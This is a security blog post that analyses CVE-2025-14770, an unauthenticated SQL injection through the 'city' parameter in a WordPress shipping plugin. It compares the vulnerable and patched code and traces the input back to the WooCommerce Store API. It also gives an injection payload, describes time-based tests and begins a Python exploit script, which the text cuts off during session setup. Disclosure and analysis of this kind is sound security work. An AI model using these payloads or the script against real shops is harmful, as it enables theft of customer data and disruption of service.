<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="WordPress Shipping Rate By Cities PluginOverview CVE ID: CVE-2025-14770 Affected Plugin: Shipping Rate By Cities Affected Versions: ≤ 2.0.0 Vulnerability Type: Unauthenticated SQL Injection Attack Ve">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter">
<meta property="og:url" content="https://pzhat.github.io/2026/01/27/2026-01-27-CVE-2025-14770/index.html">
<meta property="og:site_name" content="Phat Mai Blog">
<meta property="og:description" content="WordPress Shipping Rate By Cities PluginOverview CVE ID: CVE-2025-14770 Affected Plugin: Shipping Rate By Cities Affected Versions: ≤ 2.0.0 Vulnerability Type: Unauthenticated SQL Injection Attack Ve">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pzhat.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2026-01-27T14:19:14.489Z">
<meta property="article:modified_time" content="2026-01-31T17:13:28.367Z">
<meta property="article:author" content="Phat Mai">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="WordPress">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pzhat.github.io/img/avatar.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter",
  "url": "https://pzhat.github.io/2026/01/27/2026-01-27-CVE-2025-14770/",
  "image": "https://pzhat.github.io/img/avatar.jpg",
  "datePublished": "2026-01-27T14:19:14.489Z",
  "dateModified": "2026-01-31T17:13:28.367Z",
  "author": [
    {
      "@type": "Person",
      "name": "Phat Mai",
      "url": "https://pzhat.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2026/01/27/2026-01-27-CVE-2025-14770/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/mobile-cover-fix.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/background2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-27T14:19:14.489Z" title="Created 2026-01-27 21:19:14">2026-01-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-31T17:13:28.367Z" title="Updated 2026-02-01 00:13:28">2026-02-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/CVE/">CVE</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="https://hackmd.io/_uploads/r1isJ3HLZl.png" alt="image"></p>
<h1 id="WordPress-Shipping-Rate-By-Cities-Plugin"><a href="#WordPress-Shipping-Rate-By-Cities-Plugin" class="headerlink" title="WordPress Shipping Rate By Cities Plugin"></a>WordPress Shipping Rate By Cities Plugin</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><ul>
<li><strong>CVE ID:</strong> CVE-2025-14770</li>
<li><strong>Affected Plugin:</strong> Shipping Rate By Cities</li>
<li><strong>Affected Versions:</strong> ≤ 2.0.0</li>
<li><strong>Vulnerability Type:</strong> Unauthenticated SQL Injection</li>
<li><strong>Attack Vector:</strong> Network</li>
<li><strong>Authentication Required:</strong> No</li>
</ul>
<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The <strong>Shipping Rate By Cities</strong> WordPress plugin contains an <strong>unauthenticated SQL Injection</strong> vulnerability in versions up to <strong>2.0.0</strong>.<br>The issue originates from unsafe handling of the <code>city</code> parameter, which is concatenated directly into an SQL query without proper preparation.</p>
<p>Because the vulnerable code is reachable during the <strong>WooCommerce checkout flow</strong>, an attacker does <strong>not need authentication</strong> to exploit it.</p>
<p>Successful exploitation allows an attacker to manipulate SQL queries, potentially leading to:</p>
<ul>
<li>Sensitive data disclosure</li>
<li>Database enumeration</li>
<li>Service degradation via time-based payloads</li>
</ul>
<h2 id="Patch-Commit-Analysis"><a href="#Patch-Commit-Analysis" class="headerlink" title="Patch &amp; Commit Analysis"></a>Patch &amp; Commit Analysis</h2><p><img src="https://hackmd.io/_uploads/SyZ78G8LWg.png" alt="image"></p>
<p>Based on the image provided, here is the technical analysis of the patch for <strong>CVE-2025-14770</strong> in the “Shipping Rate by Cities” WordPress plugin.</p>
<p><strong>The Vulnerability: SQL Injection (SQLi)</strong></p>
<p>Looking at the right side (the old version), the code for the getCityFee function was:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCityFee</span>(<span class="params"><span class="variable">$city_name</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">global</span> <span class="variable">$wpdb</span>;</span><br><span class="line">       <span class="variable">$table</span> = <span class="variable">$wpdb</span>-&gt;prefix . <span class="string">&quot;shiprate_cities&quot;</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">get_row</span>(<span class="string">&quot;SELECT rate FROM <span class="subst">$table</span> where city_name = &#x27;<span class="subst">$city_name</span>&#x27;&quot;</span>, ARRAY_A);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>The Problem</strong>: The variable <strong>$city_name</strong> was directly concatenated into the SQL query string.</li>
<li><strong>The Risk</strong>: Since <strong>$city_name</strong> likely comes from a user-controlled source (like a checkout form), an attacker could input something like ‘ OR 1&#x3D;1 – to manipulate the query, bypass logic, or extract sensitive data from the database.</li>
</ul>
<p><strong>The Patch</strong>: Secure Coding Practices<br>The left side (the new version) introduces several layers of defense to mitigate this vulnerability</p>
<p><strong>Input Sanitization</strong><br>The patch adds:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$city_name</span> = <span class="title function_ invoke__">sanitize_text_field</span>(<span class="variable">$city_name</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>This is the first line of defense. It strips out HTML tags and characters that shouldn’t be in a simple text field, reducing the attack surface.</li>
</ul>
<p><strong>Prepared Statements (The Core Fix)</strong><br>The most critical change is the shift to the $wpdb-&gt;prepare() method:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">get_row</span>(</span><br><span class="line">    <span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">prepare</span>(</span><br><span class="line">        <span class="string">&quot;SELECT rate FROM <span class="subst">&#123;$wpdb-&gt;prefix&#125;</span>shiprate_cities WHERE city_name = %s&quot;</span>,</span><br><span class="line">        <span class="variable">$city_name</span></span><br><span class="line">    ),</span><br><span class="line">    ARRAY_A</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>How it works:</strong> Instead of building a string, it uses a placeholder (%s). WordPress then handles the data binding, ensuring that the value of $city_name is treated strictly as data, not as part of the SQL command. This effectively kills the SQL Injection vector.</li>
</ul>
<p><strong>Implementation of Object Caching</strong><br>The patch also introduces the WordPress Cache API:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cached</span> = <span class="title function_ invoke__">wp_cache_get</span>(<span class="variable">$cache_key</span>, <span class="variable">$cache_group</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$cached</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cached</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="title function_ invoke__">wp_cache_set</span>(<span class="variable">$cache_key</span>, <span class="variable">$result</span>, <span class="variable">$cache_group</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>While primarily introduced for performance optimization, object caching may reduce repeated identical queries, but it should not be considered a security mitigation against SQL Injection or DoS attacks, as attackers can still bypass cache by varying input values.</li>
</ul>
<h2 id="Attack-Flow"><a href="#Attack-Flow" class="headerlink" title="Attack Flow"></a>Attack Flow</h2><p>I have categorized the data flow into two main processes:</p>
<ul>
<li>Admin Process: How data is stored in the database (Configuration).</li>
</ul>
<p><img src="https://hackmd.io/_uploads/rJHqDXUIWg.png" alt="image"></p>
<ul>
<li>User&#x2F;Checkout Process: How data is retrieved and used (The Vulnerable Path).</li>
</ul>
<p><img src="https://hackmd.io/_uploads/H19y_78UWg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/BJMFOQ8U-x.png" alt="image"></p>
<h2 id="SINK-SOURCE-Backtrace"><a href="#SINK-SOURCE-Backtrace" class="headerlink" title="SINK -&gt; SOURCE (Backtrace)"></a>SINK -&gt; SOURCE (Backtrace)</h2><p>I present this part in the report to explain “The path of malicious data</p>
<ul>
<li>File: shiprate-cities-method-class.php</li>
<li>Class&#x2F;Method: ShipRate_FlatShipRateCity_Method::getCityFee($city_name)</li>
</ul>
<p><img src="https://hackmd.io/_uploads/BJdiBVOLbg.png" alt="image"></p>
<p><strong>Caller (Function to call and transmit data)</strong></p>
<p>After the breakpoint was hit it will call <code>ShipRate_FlatShipRateCity_Method::calculate_shipping($package)</code> method.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calculate_shipping</span>(<span class="params"> <span class="variable">$package</span> = <span class="keyword">array</span>(<span class="params"></span>) </span>) </span>&#123;</span><br><span class="line">    <span class="variable">$weight</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$cost</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$package</span>[<span class="string">&quot;destination&quot;</span>]; <span class="comment">// country, state, postcode, city, address, address_1, address_2</span></span><br><span class="line">    <span class="variable">$cost</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCityFee</span>(<span class="variable">$address</span>[<span class="string">&#x27;city&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>The variable <code>$package</code> is an array containing cart information and shipping address. This variable has not been strictly controlled at this step.</p>
<p><strong>Trigger (WordPress&#x2F;WooCommerce Hook Mechanism)</strong></p>
<ul>
<li>Mechanism: The plugin registers this method into the WooCommerce system through the hooks <code>woocommerce_shipping_init</code> and <code>woocommerce_shipping_methods</code> (in the main plugin file).</li>
<li>Flow: When WooCommerce needs to recalculate the total amount (when the user changes address, adds items…), it will loop through all activated Shipping Methods and call the calculate_shipping($package) function of each one.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/BJW35Vu8bg.png" alt="image"></p>
<p><strong>SOURCE (Input Point &amp; Entry Point)</strong></p>
<p>Unlike standard WordPress Form submissions ($_POST), JSON data sent via REST API is not subjected to WordPress’s default wp_magic_quotes() mechanism. This allows raw single quotes (‘) to reach the vulnerable function without being escaped as &#39;, making the SQL Injection possible.</p>
<ul>
<li>Entry Point: Hacker sends Request to REST API <code>/wp-json/wc/store/v1/cart/update-customer</code>.</li>
<li>Controller: <code>Automattic\WooCommerce\StoreApi\Routes\V1\CartUpdateCustomer::get_response </code>(This is the core code of WooCommerce).</li>
</ul>
<h2 id="POC-And-Debug"><a href="#POC-And-Debug" class="headerlink" title="POC And Debug"></a>POC And Debug</h2><p>When a user updates their shipping information on a WooCommerce site, the browser sends a REST API request to all action.</p>
<p><strong>Endpoint:&#x2F;wp-json&#x2F;wc&#x2F;store&#x2F;v1&#x2F;cart</strong></p>
<p><img src="https://hackmd.io/_uploads/S1JMlBOL-l.png" alt="image"></p>
<p>After proceed checkout, we can see that it calls a REST API to check the cart and check for every value like address or state in personal customer details.</p>
<p><img src="https://hackmd.io/_uploads/SkcTlruLbl.png" alt="image"></p>
<p>When i change shipping address value and change shipping method, i got an API called <code>/wp-json/wc/store/v1/batch?_locale=site</code>, as we saw at the image above, it will request to another API called <code>/wc/store/v1/cart/update-customer</code> and this this the place that called entry point because its function was to changed the customer details. Besides, the vulnerable value is <code>city</code>.</p>
<p><strong>Why send an <code>update-customer</code> request?</strong></p>
<ul>
<li>Because the <code>getCityFee</code> error function uses <code>City</code> as input.</li>
<li>The update-customer API is the standard endpoint to change City to enable Shipping Calculation.</li>
</ul>
<p>Once the API receives this data, the following “domino effect” occurs inside WordPress:</p>
<ul>
<li><strong>Data Processing:</strong> WooCommerce receives the JSON and updates the session&#x2F;cart object with the new address.</li>
<li><strong>Shipping Recalculation:</strong> WooCommerce triggers a recalculation of shipping costs to reflect the new address. It looks for active shipping methods.</li>
<li><strong>The Hook:</strong> The “Shipping Rate by Cities” plugin is activated. It retrieves the city name from the cart to look up the specific rate in its database table.</li>
<li><strong>The Vulnerable Call:</strong> The plugin passes the raw, unsanitized string from the API directly into the function we saw in the diff:</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCityFee</span>(<span class="variable">$city_name</span>);</span><br></pre></td></tr></table></figure>

<p>Using that logic vulnerable at city variable, now i can inject SQL query to trigger vulnerability.</p>
<p><img src="https://hackmd.io/_uploads/B13JXmI8Zl.png" alt="image"></p>
<p>The response time is roughly 4x the sleep value. This behavior is consistent with WooCommerce’s cart recalculation lifecycle, where shipping methods may be evaluated multiple times per request (e.g., for billing and shipping contexts), resulting in repeated execution of the vulnerable query.</p>
<p>To further validate this behavior, the sleep duration was modified to observe the corresponding change in response time.</p>
<p><img src="https://hackmd.io/_uploads/ByyeVXUIZx.png" alt="image"></p>
<p>After change payload’s sleep time to 5 and sent the request, look at the response show that the time response was decrease about half and it took just 21s. That prove that POC success. Now create a python script to make exploit process be automated.</p>
<details>
<summary>Click see script in details</summary>

<br>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============================================================================</span></span><br><span class="line"><span class="comment"># CONFIGURATION</span></span><br><span class="line"><span class="comment"># ==============================================================================</span></span><br><span class="line"><span class="comment"># URL of the WordPress site (e.g., http://localhost or https://target.com)</span></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://localhost&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># ID of a REAL product on the target site (Required to initialize the cart)</span></span><br><span class="line"><span class="comment"># Go to WP Admin -&gt; Products -&gt; Hover over a product to see the ID.</span></span><br><span class="line">PRODUCT_ID = <span class="number">71</span>                 </span><br><span class="line"></span><br><span class="line"><span class="comment"># Time in seconds to sleep if the guess is correct (Latency check)</span></span><br><span class="line">SLEEP_TIME = <span class="number">3</span>                  </span><br><span class="line"></span><br><span class="line"><span class="comment"># API Endpoints</span></span><br><span class="line">API_ADD_ITEM = <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/wp-json/wc/store/v1/cart/add-item&quot;</span></span><br><span class="line">API_UPDATE_CUSTOMER = <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/wp-json/wc/store/v1/cart/update-customer&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize Session</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup_session</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Step 1: Initialize WooCommerce Session</span></span><br><span class="line"><span class="string">    We must add an item to the cart to generate valid &#x27;Nonce&#x27; and &#x27;Cart-Token&#x27; headers.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Initializing session and adding product to cart...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># First request to trigger session creation and get headers</span></span><br><span class="line">        <span class="comment"># Even if this fails (400/401), it usually returns the Nonce in headers</span></span><br><span class="line">        r = s.post(API_ADD_ITEM, json=&#123;<span class="string">&quot;id&quot;</span>: PRODUCT_ID, <span class="string">&quot;quantity&quot;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        nonce = r.headers.get(<span class="string">&#x27;Nonce&#x27;</span>)</span><br><span class="line">        cart_token = r.headers.get(<span class="string">&#x27;Cart-Token&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> nonce <span class="keyword">or</span> <span class="keyword">not</span> cart_token:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Failed to retrieve Nonce or Cart-Token.&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Hint: Check if the PRODUCT_ID exists and is publish.&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Nonce captured: <span class="subst">&#123;nonce&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Cart-Token captured: <span class="subst">&#123;cart_token[:<span class="number">20</span>]&#125;</span>...&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Update session headers for subsequent requests</span></span><br><span class="line">        